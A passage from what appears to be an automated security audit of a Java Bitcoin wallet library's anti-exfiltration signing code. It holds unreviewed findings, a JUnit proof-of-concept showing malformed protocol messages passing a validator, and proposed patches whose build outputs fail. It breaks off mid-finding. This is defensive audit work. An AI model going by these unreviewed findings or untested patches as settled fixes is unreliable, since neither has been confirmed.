             throw new AntiExfilException(INVALID_MESSAGE, name + " is not a secp256k1 point", e);
         }
     }
 
     private static void requireLength(byte[] value, int expected, String name) {
         if(length(value) != expected) throw fail(INVALID_MESSAGE, name + " must be exactly " + expected + " bytes");
     }
 
     private static int length(byte[] value) { return value == null ? -1 : value.length; }
     private static byte[] read(ByteBuffer buffer, int length) { byte[] value = new byte[length]; buffer.get(value); return value; }
     private static AntiExfilException fail(AntiExfilException.Code code, String message) { return new AntiExfilException(code, message); }
 
     private record Bytes(byte[] value) {
         @Override public boolean equals(Object object) { return object instanceof Bytes other && Arrays.equals(value, other.value); }
         @Override public int hashCode() { return Arrays.hashCode(value); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java`
### Validation output

```
[output truncated: 28 lines & 0.8154296875 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 5s
```

---

# Transition validator accepts malformed messages
**#248000**
- Severity: Medium
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java` (2 locations)
#### Lines 84-109 — _The public transition method performs no full validation._

```
    public static void validateTransition(AntiExfilMessage previous, AntiExfilMessage current) {
        if(current.getStage().getCode() != previous.getStage().getCode() + 1) throw fail(WRONG_STAGE, "Stages are not adjacent");
        if(previous.getNetwork() != current.getNetwork()
                || !Arrays.equals(previous.getSessionId(), current.getSessionId())
                || !Arrays.equals(previous.getPsbtDigest(), current.getPsbtDigest())) {
            throw fail(TRANSACTION_MISMATCH, "Transcript context changed between stages");
        }
        if(previous.getSlots().size() != current.getSlots().size()) throw fail(SIGNATURE_SLOT_MISMATCH, "Slot count changed");
        for(int i = 0; i < previous.getSlots().size(); i++) {
            AntiExfilSlot before = previous.getSlots().get(i);
            AntiExfilSlot after = current.getSlots().get(i);
            if(before.getInputIndex() != after.getInputIndex()
                    || before.getSighashType() != after.getSighashType()
                    || !Arrays.equals(before.getSignerPublicKey(), after.getSignerPublicKey())
                    || !Arrays.equals(before.getMessageHash(), after.getMessageHash())) {
                throw fail(SIGNATURE_SLOT_MISMATCH, "Slot identity or signing context changed");
            }
            if(!Arrays.equals(before.getCommitment(), after.getCommitment())) throw fail(COMMITMENT_MISMATCH, "Commitment changed");
            if(previous.getStage().getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode()
                    && !Arrays.equals(before.getOpening(), after.getOpening())) throw fail(OPENING_MISMATCH, "Accepted opening changed");
            if(current.getStage() == AntiExfilStage.HOST_REVEAL
                    && !Arrays.equals(AntiExfilCrypto.hostCommit(after.getHostRandomness()), after.getCommitment())) {
                throw fail(COMMITMENT_MISMATCH, "Host reveal does not match commitment");
            }
        }
    }
```
⋯
#### Lines 111-155 — _The omitted header, point, presence, ordering, and scalar checks live only here._

```
    public static void validate(AntiExfilMessage message) {
        if(message == null || message.getNetwork() == null || message.getStage() == null
                || length(message.getSessionId()) != 32 || length(message.getPsbtDigest()) != 32
                || message.getSlots() == null || message.getSlots().isEmpty() || message.getSlots().size() > MAX_SLOTS) {
            throw fail(INVALID_MESSAGE, "Invalid AEXB message header");
        }
        Set<Bytes> commitments = new HashSet<>();
        Set<Bytes> reveals = new HashSet<>();
        long previousInput = -1;
        byte[] previousKey = null;
        int perInput = 0;
        for(AntiExfilSlot slot : message.getSlots()) {
            validateSlot(message.getStage(), slot);
            int order = previousKey == null ? 1 : compareIdentifier(previousInput, previousKey, slot.getInputIndex(), slot.getSignerPublicKey());
            if(order >= 0 && previousKey != null) throw fail(SIGNATURE_SLOT_MISMATCH, "Slots are not uniquely ordered");
            perInput = slot.getInputIndex() == previousInput ? perInput + 1 : 1;
            if(perInput > MAX_SLOTS_PER_INPUT) throw fail(SIGNATURE_SLOT_MISMATCH, "Input exceeds the slot limit");
            if(!commitments.add(new Bytes(slot.getCommitment()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host commitment");
            if(slot.getHostRandomness() != null && !reveals.add(new Bytes(slot.getHostRandomness()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host reveal");
            previousInput = slot.getInputIndex();
            previousKey = slot.getSignerPublicKey();
        }
    }

    private static void validateSlot(AntiExfilStage stage, AntiExfilSlot slot) {
        if(slot == null || slot.getInputIndex() < 0 || slot.getInputIndex() > 0xffff_ffffL || slot.getSighashType() != SIGHASH_ALL) {
            throw fail(INVALID_MESSAGE, "Invalid slot index or sighash");
        }
        requirePoint(slot.getSignerPublicKey(), "signer public key");
        requireLength(slot.getMessageHash(), 32, "message hash");
        requireLength(slot.getCommitment(), 32, "host commitment");
        boolean needsOpening = stage.getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode();
        if((slot.getOpening() != null) != needsOpening) throw fail(INVALID_MESSAGE, "Opening presence conflicts with stage");
        if((slot.getHostRandomness() != null) != (stage == AntiExfilStage.HOST_REVEAL)) throw fail(INVALID_MESSAGE, "Reveal presence conflicts with stage");
        if((slot.getSignature() != null) != (stage == AntiExfilStage.SIGNER_SIGNATURES)) throw fail(INVALID_MESSAGE, "Signature presence conflicts with stage");
        if(slot.getOpening() != null) requirePoint(slot.getOpening(), "signer opening");
        if(slot.getHostRandomness() != null) requireLength(slot.getHostRandomness(), 32, "host reveal");
        if(slot.getSignature() != null) {
            requireLength(slot.getSignature(), 64, "compact signature");
            BigInteger r = new BigInteger(1, Arrays.copyOfRange(slot.getSignature(), 0, 32));
            BigInteger s = new BigInteger(1, Arrays.copyOfRange(slot.getSignature(), 32, 64));
            if(r.signum() <= 0 || r.compareTo(ECKey.CURVE.getN()) >= 0 || s.signum() <= 0 || s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) {
                throw fail(INVALID_MESSAGE, "Signature scalars are invalid or non-low-S");
            }
        }
```
## Description

The public `validateTransition` method checks adjacency and equality of selected fields but never calls `validate` on either message. Direct object callers can supply adjacent stages with empty session IDs, digests, keys, hashes, and commitments, plus a null stage-required opening, and every comparison in the transition method can still succeed. A reveal-to-signatures pair can similarly omit its signature because transition validation never checks signature presence or scalar validity. The omitted point, length, stage-presence, ordering, and scalar checks exist only in the separate validator. Coordinator byte-ingress currently decodes and validates first, so the bypass affects callers that use the public object-form method as their validation boundary.
## Root cause

Transition validation assumes, but does not enforce or document, that both public message objects already passed structural and cryptographic validation.
## Impact

A direct library caller can accept malformed, non-encodable protocol transitions and proceed under a false validation result. This can cause downstream unchecked failures or application-level acceptance of transcripts that do not conform to AEXB, although the coordinator's current byte-based paths are protected.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.crypto.ECKey;
import org.junit.jupiter.api.Test;

import java.math.BigInteger;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

/**
 * PoC for public AntiExfilCodec.validateTransition accepting object-form transitions
 * whose messages are structurally invalid and non-encodable.
 */
class Poc {
    @Test
    void validateTransitionAcceptsSignerOpeningsMessageWithMissingOpening() {
        byte[] sessionId = repeat(0x11, 32);
        byte[] psbtDigest = repeat(0x22, 32);
        byte[] signerPublicKey = publicKey(2);
        byte[] messageHash = repeat(0x44, 32);
        byte[] commitment = repeat(0x55, 32);

        AntiExfilSlot validHostCommitSlot = new AntiExfilSlot(0, AntiExfilCodec.SIGHASH_ALL,
                signerPublicKey, messageHash, commitment, null, null, null);
        AntiExfilSlot malformedSignerOpeningsSlot = new AntiExfilSlot(0, AntiExfilCodec.SIGHASH_ALL,
                signerPublicKey, messageHash, commitment, null, null, null);

        AntiExfilMessage validHostCommit = new AntiExfilMessage(AntiExfilNetwork.TESTNET4,
                AntiExfilStage.HOST_COMMIT, sessionId, psbtDigest, List.of(validHostCommitSlot));
        AntiExfilMessage malformedSignerOpenings = new AntiExfilMessage(AntiExfilNetwork.TESTNET4,
                AntiExfilStage.SIGNER_OPENINGS, sessionId, psbtDigest, List.of(malformedSignerOpeningsSlot));

        assertDoesNotThrow(() -> AntiExfilCodec.validate(validHostCommit));
        assertThrows(AntiExfilException.class, () -> AntiExfilCodec.validate(malformedSignerOpenings));
        assertThrows(AntiExfilException.class, () -> AntiExfilCodec.encode(malformedSignerOpenings));

        assertDoesNotThrow(() -> AntiExfilCodec.validateTransition(validHostCommit, malformedSignerOpenings));
    }

    @Test
    void validateTransitionAcceptsSignerSignaturesMessageWithMissingSignature() {
        byte[] sessionId = repeat(0x11, 32);
        byte[] psbtDigest = repeat(0x22, 32);
        byte[] signerPublicKey = publicKey(2);
        byte[] messageHash = repeat(0x44, 32);
        byte[] hostRandomness = repeat(0x55, 32);
        byte[] commitment = AntiExfilCrypto.hostCommit(hostRandomness);
        byte[] opening = publicKey(3);

        AntiExfilSlot validRevealSlot = new AntiExfilSlot(0, AntiExfilCodec.SIGHASH_ALL,
                signerPublicKey, messageHash, commitment, opening, hostRandomness, null);
        AntiExfilSlot malformedSignaturesSlot = new AntiExfilSlot(0, AntiExfilCodec.SIGHASH_ALL,
                signerPublicKey, messageHash, commitment, opening, null, null);

        AntiExfilMessage validReveal = new AntiExfilMessage(AntiExfilNetwork.TESTNET4,
                AntiExfilStage.HOST_REVEAL, sessionId, psbtDigest, List.of(validRevealSlot));
        AntiExfilMessage malformedSignatures = new AntiExfilMessage(AntiExfilNetwork.TESTNET4,
                AntiExfilStage.SIGNER_SIGNATURES, sessionId, psbtDigest, List.of(malformedSignaturesSlot));

        assertDoesNotThrow(() -> AntiExfilCodec.validate(validReveal));
        assertThrows(AntiExfilException.class, () -> AntiExfilCodec.validate(malformedSignatures));
        assertThrows(AntiExfilException.class, () -> AntiExfilCodec.encode(malformedSignatures));

        assertDoesNotThrow(() -> AntiExfilCodec.validateTransition(validReveal, malformedSignatures));
    }

    private static byte[] publicKey(int privateScalar) {
        return ECKey.fromPrivate(BigInteger.valueOf(privateScalar)).getPubKey();
    }

    private static byte[] repeat(int value, int length) {
        byte[] bytes = new byte[length];
        for(int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte)value;
        }
        return bytes;
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 19 lines & 0.6396484375 KB skipped]
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :processTestResources UP-TO-DATE
> Task :testClasses UP-TO-DATE
> Task :test

BUILD SUCCESSFUL in 1s
5 actionable tasks: 1 executed, 4 up-to-date
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC executed successfully with the configured Gradle/JUnit harness. It demonstrates only the public object-form API boundary: direct callers that construct AntiExfilMessage/AntiExfilSlot instances and rely on AntiExfilCodec.validateTransition as full validation can accept malformed, non-encodable transitions. It does not claim the byte-based AntiExfilCoordinator ingress is bypassed; the test separately proves AntiExfilCodec.validate and encode reject the malformed messages while validateTransition accepts them.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Validate both object-form messages before checking transition adjacency and transcript continuity, so malformed headers, slots, stage-specific fields, points, ordering, and signature scalars are rejected at the public transition boundary.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
@@ -1,186 +1,188 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.crypto.ECKey;
 
 import java.math.BigInteger;
 import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCodec {
     public static final byte[] MAGIC = {'A', 'E', 'X', 'B'};
     public static final int FORMAT_VERSION = 1;
     public static final long SIGHASH_ALL = 1;
     public static final int MAX_SLOTS = 128;
     public static final int MAX_SLOTS_PER_INPUT = 16;
     public static final int MAX_MESSAGE_BYTES = 65_536;
     public static final int HEADER_LENGTH = 78;
     public static final int COMMON_RECORD_LENGTH = 105;
 
     private AntiExfilCodec() {
     }
 
     public static byte[] encode(AntiExfilMessage message) {
         validate(message);
         int payloadLength = Math.multiplyExact(message.getSlots().size(), message.getStage().getRecordLength());
         ByteBuffer buffer = ByteBuffer.allocate(HEADER_LENGTH + payloadLength);
         buffer.put(MAGIC).put((byte)FORMAT_VERSION).put((byte)message.getNetwork().getCode())
                 .put((byte)message.getStage().getCode()).put((byte)0).putInt(payloadLength)
                 .put(message.getSessionId()).put(message.getPsbtDigest()).putShort((short)message.getSlots().size());
         for(AntiExfilSlot slot : message.getSlots()) {
             buffer.putInt((int)slot.getInputIndex()).putInt((int)slot.getSighashType())
                     .put(slot.getSignerPublicKey()).put(slot.getMessageHash()).put(slot.getCommitment());
             if(message.getStage().getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode()) buffer.put(slot.getOpening());
             if(message.getStage() == AntiExfilStage.HOST_REVEAL) buffer.put(slot.getHostRandomness());
             if(message.getStage() == AntiExfilStage.SIGNER_SIGNATURES) buffer.put(slot.getSignature());
         }
         return buffer.array();
     }
 
     public static AntiExfilMessage decode(byte[] encoded) {
         if(encoded == null || encoded.length < HEADER_LENGTH || encoded.length > MAX_MESSAGE_BYTES) {
             throw fail(INVALID_MESSAGE, "AEXB message length is outside v1 limits");
         }
         ByteBuffer buffer = ByteBuffer.wrap(encoded);
         byte[] magic = new byte[4];
         buffer.get(magic);
         if(!Arrays.equals(magic, MAGIC)) throw fail(INVALID_MESSAGE, "Wrong AEXB magic");
         if(Byte.toUnsignedInt(buffer.get()) != FORMAT_VERSION) throw fail(INVALID_MESSAGE, "Unsupported AEXB version");
         AntiExfilNetwork network = AntiExfilNetwork.fromCode(Byte.toUnsignedInt(buffer.get()));
         AntiExfilStage stage = AntiExfilStage.fromCode(Byte.toUnsignedInt(buffer.get()));
         if(buffer.get() != 0) throw fail(INVALID_MESSAGE, "Unknown AEXB flags are set");
         long payloadLength = Integer.toUnsignedLong(buffer.getInt());
         byte[] sessionId = new byte[32];
         byte[] psbtDigest = new byte[32];
         buffer.get(sessionId).get(psbtDigest);
         int slotCount = Short.toUnsignedInt(buffer.getShort());
         if(slotCount < 1 || slotCount > MAX_SLOTS) throw fail(INVALID_MESSAGE, "AEXB slot count is outside v1 limits");
         long expectedPayload = (long)slotCount * stage.getRecordLength();
         if(payloadLength != expectedPayload || encoded.length != HEADER_LENGTH + expectedPayload) {
             throw fail(INVALID_MESSAGE, "AEXB payload length is not canonical for its stage");
         }
         List<AntiExfilSlot> slots = new ArrayList<>(slotCount);
         for(int i = 0; i < slotCount; i++) {
             long inputIndex = Integer.toUnsignedLong(buffer.getInt());
             long sighash = Integer.toUnsignedLong(buffer.getInt());
             byte[] publicKey = read(buffer, 33);
             byte[] messageHash = read(buffer, 32);
             byte[] commitment = read(buffer, 32);
             byte[] opening = stage.getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode() ? read(buffer, 33) : null;
             byte[] rho = stage == AntiExfilStage.HOST_REVEAL ? read(buffer, 32) : null;
             byte[] signature = stage == AntiExfilStage.SIGNER_SIGNATURES ? read(buffer, 64) : null;
             slots.add(new AntiExfilSlot(inputIndex, sighash, publicKey, messageHash, commitment, opening, rho, signature));
         }
         AntiExfilMessage message = new AntiExfilMessage(network, stage, sessionId, psbtDigest, slots);
         validate(message);
         return message;
     }
 
     public static void validateTransition(AntiExfilMessage previous, AntiExfilMessage current) {
+        validate(previous);
+        validate(current);
         if(current.getStage().getCode() != previous.getStage().getCode() + 1) throw fail(WRONG_STAGE, "Stages are not adjacent");
         if(previous.getNetwork() != current.getNetwork()
                 || !Arrays.equals(previous.getSessionId(), current.getSessionId())
                 || !Arrays.equals(previous.getPsbtDigest(), current.getPsbtDigest())) {
             throw fail(TRANSACTION_MISMATCH, "Transcript context changed between stages");
         }
         if(previous.getSlots().size() != current.getSlots().size()) throw fail(SIGNATURE_SLOT_MISMATCH, "Slot count changed");
         for(int i = 0; i < previous.getSlots().size(); i++) {
             AntiExfilSlot before = previous.getSlots().get(i);
             AntiExfilSlot after = current.getSlots().get(i);
             if(before.getInputIndex() != after.getInputIndex()
                     || before.getSighashType() != after.getSighashType()
                     || !Arrays.equals(before.getSignerPublicKey(), after.getSignerPublicKey())
                     || !Arrays.equals(before.getMessageHash(), after.getMessageHash())) {
                 throw fail(SIGNATURE_SLOT_MISMATCH, "Slot identity or signing context changed");
             }
             if(!Arrays.equals(before.getCommitment(), after.getCommitment())) throw fail(COMMITMENT_MISMATCH, "Commitment changed");
             if(previous.getStage().getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode()
                     && !Arrays.equals(before.getOpening(), after.getOpening())) throw fail(OPENING_MISMATCH, "Accepted opening changed");
             if(current.getStage() == AntiExfilStage.HOST_REVEAL
                     && !Arrays.equals(AntiExfilCrypto.hostCommit(after.getHostRandomness()), after.getCommitment())) {
                 throw fail(COMMITMENT_MISMATCH, "Host reveal does not match commitment");
             }
         }
     }
 
     public static void validate(AntiExfilMessage message) {
         if(message == null || message.getNetwork() == null || message.getStage() == null
                 || length(message.getSessionId()) != 32 || length(message.getPsbtDigest()) != 32
                 || message.getSlots() == null || message.getSlots().isEmpty() || message.getSlots().size() > MAX_SLOTS) {
             throw fail(INVALID_MESSAGE, "Invalid AEXB message header");
         }
         Set<Bytes> commitments = new HashSet<>();
         Set<Bytes> reveals = new HashSet<>();
         long previousInput = -1;
         byte[] previousKey = null;
         int perInput = 0;
         for(AntiExfilSlot slot : message.getSlots()) {
             validateSlot(message.getStage(), slot);
             int order = previousKey == null ? 1 : compareIdentifier(previousInput, previousKey, slot.getInputIndex(), slot.getSignerPublicKey());
             if(order >= 0 && previousKey != null) throw fail(SIGNATURE_SLOT_MISMATCH, "Slots are not uniquely ordered");
             perInput = slot.getInputIndex() == previousInput ? perInput + 1 : 1;
             if(perInput > MAX_SLOTS_PER_INPUT) throw fail(SIGNATURE_SLOT_MISMATCH, "Input exceeds the slot limit");
             if(!commitments.add(new Bytes(slot.getCommitment()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host commitment");
             if(slot.getHostRandomness() != null && !reveals.add(new Bytes(slot.getHostRandomness()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host reveal");
             previousInput = slot.getInputIndex();
             previousKey = slot.getSignerPublicKey();
         }
     }
 
     private static void validateSlot(AntiExfilStage stage, AntiExfilSlot slot) {
         if(slot == null || slot.getInputIndex() < 0 || slot.getInputIndex() > 0xffff_ffffL || slot.getSighashType() != SIGHASH_ALL) {
             throw fail(INVALID_MESSAGE, "Invalid slot index or sighash");
         }
         requirePoint(slot.getSignerPublicKey(), "signer public key");
         requireLength(slot.getMessageHash(), 32, "message hash");
         requireLength(slot.getCommitment(), 32, "host commitment");
         boolean needsOpening = stage.getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode();
         if((slot.getOpening() != null) != needsOpening) throw fail(INVALID_MESSAGE, "Opening presence conflicts with stage");
         if((slot.getHostRandomness() != null) != (stage == AntiExfilStage.HOST_REVEAL)) throw fail(INVALID_MESSAGE, "Reveal presence conflicts with stage");
         if((slot.getSignature() != null) != (stage == AntiExfilStage.SIGNER_SIGNATURES)) throw fail(INVALID_MESSAGE, "Signature presence conflicts with stage");
         if(slot.getOpening() != null) requirePoint(slot.getOpening(), "signer opening");
         if(slot.getHostRandomness() != null) requireLength(slot.getHostRandomness(), 32, "host reveal");
         if(slot.getSignature() != null) {
             requireLength(slot.getSignature(), 64, "compact signature");
             BigInteger r = new BigInteger(1, Arrays.copyOfRange(slot.getSignature(), 0, 32));
             BigInteger s = new BigInteger(1, Arrays.copyOfRange(slot.getSignature(), 32, 64));
             if(r.signum() <= 0 || r.compareTo(ECKey.CURVE.getN()) >= 0 || s.signum() <= 0 || s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) {
                 throw fail(INVALID_MESSAGE, "Signature scalars are invalid or non-low-S");
             }
         }
     }
 
     private static int compareIdentifier(long leftIndex, byte[] leftKey, long rightIndex, byte[] rightKey) {
         int indexComparison = Long.compare(leftIndex, rightIndex);
         if(indexComparison != 0) return indexComparison;
         return Arrays.compareUnsigned(leftKey, rightKey);
     }
 
     private static void requirePoint(byte[] point, String name) {
         requireLength(point, 33, name);
         if(point[0] != 2 && point[0] != 3) throw fail(INVALID_MESSAGE, name + " is not compressed");
         try {
             if(ECKey.CURVE.getCurve().decodePoint(point).isInfinity()) throw fail(INVALID_MESSAGE, name + " is infinity");
         } catch(IllegalArgumentException e) {
             throw new AntiExfilException(INVALID_MESSAGE, name + " is not a secp256k1 point", e);
         }
     }
 
     private static void requireLength(byte[] value, int expected, String name) {
         if(length(value) != expected) throw fail(INVALID_MESSAGE, name + " must be exactly " + expected + " bytes");
     }
 
     private static int length(byte[] value) { return value == null ? -1 : value.length; }
     private static byte[] read(ByteBuffer buffer, int length) { byte[] value = new byte[length]; buffer.get(value); return value; }
     private static AntiExfilException fail(AntiExfilException.Code code, String message) { return new AntiExfilException(code, message); }
 
     private record Bytes(byte[] value) {
         @Override public boolean equals(Object object) { return object instanceof Bytes other && Arrays.equals(value, other.value); }
         @Override public int hashCode() { return Arrays.hashCode(value); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java`
### Validation output

```
[output truncated: 47 lines & 6.1748046875 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Gradle build daemon disappeared unexpectedly (it may have been killed or may have crashed)

* Try:
> Run with --stacktrace option to get the stack trace.
> Run with --info or --debug option to get more log output.
> Run with --scan to generate a Build Scan (Powered by Develocity).
> Get more help at https://help.gradle.org.
```

---

# Unsupported keystores enter anti-exfil sessions
**#248001**
- Severity: Medium
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/wallet/AntiExfilKeystorePolicy.java`
#### Lines 3-24 — _The policy defines whether interactive anti-exfil is supported._

```
/**
 * Declares whether a keystore can use the interactive anti-exfil signing
 * protocol and whether that protocol is mandatory.
 */
public enum AntiExfilKeystorePolicy {
    UNSUPPORTED("Unsupported"),
    OPTIONAL("Optional"),
    REQUIRED("Required");

    private final String displayName;

    AntiExfilKeystorePolicy(String displayName) {
        this.displayName = displayName;
    }

    public boolean isSupported() {
        return this != UNSUPPORTED;
    }

    public boolean isRequired() {
        return this == REQUIRED;
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/wallet/Keystore.java` (2 locations)
#### Lines 24-32 — _Keystores default to UNSUPPORTED._

```
    private String label;
    private KeystoreSource source = KeystoreSource.SW_WATCH;
    private WalletModel walletModel = WalletModel.SPARROW;
    private KeyDerivation keyDerivation;
    private ExtendedKey extendedPublicKey;
    private PaymentCode externalPaymentCode;
    private SilentPaymentScanAddress silentPaymentScanAddress;
    private byte[] deviceRegistration;
    private AntiExfilKeystorePolicy antiExfilPolicy = AntiExfilKeystorePolicy.UNSUPPORTED;
```
⋯
#### Lines 128-149 — _The support predicate is available but unused by the new package._

```
    public boolean isAntiExfilRequired() {
        return antiExfilPolicy == AntiExfilKeystorePolicy.REQUIRED;
    }

    public void setAntiExfilRequired(boolean antiExfilRequired) {
        if(antiExfilRequired) {
            antiExfilPolicy = AntiExfilKeystorePolicy.REQUIRED;
        } else if(antiExfilPolicy == AntiExfilKeystorePolicy.REQUIRED) {
            antiExfilPolicy = AntiExfilKeystorePolicy.OPTIONAL;
        }
    }

    public AntiExfilKeystorePolicy getAntiExfilPolicy() {
        return antiExfilPolicy;
    }

    public void setAntiExfilPolicy(AntiExfilKeystorePolicy antiExfilPolicy) {
        this.antiExfilPolicy = Objects.requireNonNull(antiExfilPolicy, "Anti-exfil policy is required");
    }

    public boolean supportsAntiExfil() {
        return antiExfilPolicy.isSupported();
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java`
#### Lines 55-102 — _Enumeration ignores anti-exfil capability._

```
    public static List<AntiExfilSigningSlot> enumerateSigningSlots(byte[] raw, Keystore keystore) {
        if(keystore == null || keystore.getKeyDerivation() == null || keystore.getExtendedPublicKey() == null) {
            throw fail(INVALID_MESSAGE, "A public account keystore is required");
        }
        PSBT psbt = parseCanonicalV0(raw);
        List<AntiExfilSigningSlot> slots = new ArrayList<>();
        for(int index = 0; index < psbt.getPsbtInputs().size(); index++) {
            PSBTInput input = psbt.getPsbtInputs().get(index);
            failOnTaproot(index, input);
            if(input.getUtxo() == null) failInput(index, "missing UTXO data");
            ScriptClassification classification = classify(index, input);
            SigHash sigHash = input.getSigHash() == null ? SigHash.ALL : input.getSigHash();
            if(sigHash != SigHash.ALL) failInput(index, "protocol v1 supports only explicit SIGHASH_ALL");
            validateDerivations(index, input, classification.signingKeys());
            byte[] messageHash;
            try {
                messageHash = input.getSigningHash().getBytes();
            } catch(RuntimeException e) {
                throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": cannot derive sighash", e);
            }
            for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
                ECKey publicKey = entry.getKey();
                KeyDerivation derivation = entry.getValue();
                if(!classification.signingKeys().contains(publicKey)
                        || !keystore.getKeyDerivation().getMasterFingerprint().equals(derivation.getMasterFingerprint())) continue;
                ECKey expected = keystore.getPubKeyForDerivation(derivation);
                if(expected == null || !Arrays.equals(expected.getPubKey(), publicKey.getPubKey())) {
                    failInput(index, "BIP32 path does not derive its declared public key");
                }
                if(input.getPartialSignatures().containsKey(publicKey)) {
                    throw fail(UNEXPECTED_RETURN_DATA, "Input " + index + " already has a controlled signature");
                }
                if(input.isFinalized()) continue;
                slots.add(new AntiExfilSigningSlot(index, publicKey.getPubKey(), messageHash,
                        AntiExfilCodec.SIGHASH_ALL, derivation, classification.kind()));
            }
        }
        slots.sort((left, right) -> left.getIdentifier().compareTo(right.getIdentifier()));
        if(slots.isEmpty()) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT has no controlled signing slots");
        if(slots.size() > AntiExfilCodec.MAX_SLOTS) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT exceeds the global slot limit");
        Set<AntiExfilSigningSlot.Identifier> identifiers = new HashSet<>();
        Map<Integer, Integer> perInput = new LinkedHashMap<>();
        for(AntiExfilSigningSlot slot : slots) {
            if(!identifiers.add(slot.getIdentifier())) throw fail(SIGNATURE_SLOT_MISMATCH, "Duplicate signing slot");
            int count = perInput.merge(slot.getInputIndex(), 1, Integer::sum);
            if(count > AntiExfilCodec.MAX_SLOTS_PER_INPUT) failInput(slot.getInputIndex(), "input exceeds the per-input slot limit");
        }
        return List.copyOf(slots);
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
#### Lines 60-90 — _Creation persists a live ceremony without checking support._

```
    static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                        Keystore keystore, AntiExfilNetwork network,
                                        boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
        AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
        if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
            throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
        }
        List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
        byte[] sessionId = random32(random);
        Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
        for(AntiExfilSigningSlot slot : slots) {
            byte[] rho;
            int attempts = 0;
            do {
                if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                rho = random32(random);
            } while(containsValue(rhos, rho));
            rhos.put(slot.getIdentifier(), rho);
        }
        AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
        State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                AntiExfilCodec.encode(commit), null, null, null, null, rhos);
        List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
        if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
            throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
        }
        AntiExfilDurableFiles.locked(sessionPath, () -> {
            AntiExfilDurableFiles.write(sessionPath, encode(state), true);
            return null;
        });
        return coordinator;
```
## Description

